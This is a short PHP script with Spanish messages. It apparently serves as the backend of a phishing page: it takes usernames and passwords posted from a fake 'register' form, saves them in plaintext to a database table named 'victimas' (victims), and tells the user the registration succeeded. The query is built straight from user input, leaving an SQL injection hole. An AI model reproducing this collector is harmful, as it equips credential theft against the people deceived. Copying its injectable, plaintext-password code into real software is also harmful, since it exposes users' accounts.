<?php
    include("con_db.php");

    if ($conex) {
        echo "Se establecio conexión con la base de datos";
    } else {
        echo "No se logro conectar a la base de datos";
    }

    if (isset($_POST['register'])) {
        if (strlen($_POST['username']) >= 1 && strlen($_POST['password']) >= 1) {
            $username = trim($_POST['username']);
            $password = trim($_POST['password']);
            $consulta = "INSERT INTO victimas(username, password) VALUES ('$username','$password')";
            $resultado = mysqli_query($conex,$consulta);
            if ($resultado) {
                ?>
                <h3>Te has registrado correctamente</h3>
                <?php
            } else {
                ?>
                <h3>El registro no fue exitoso</h3>
                <?php
            }
        } else {
            /* ?>
            <h3>Por favor, complete los campos</h3>
            <?php */
        }
    }
?>
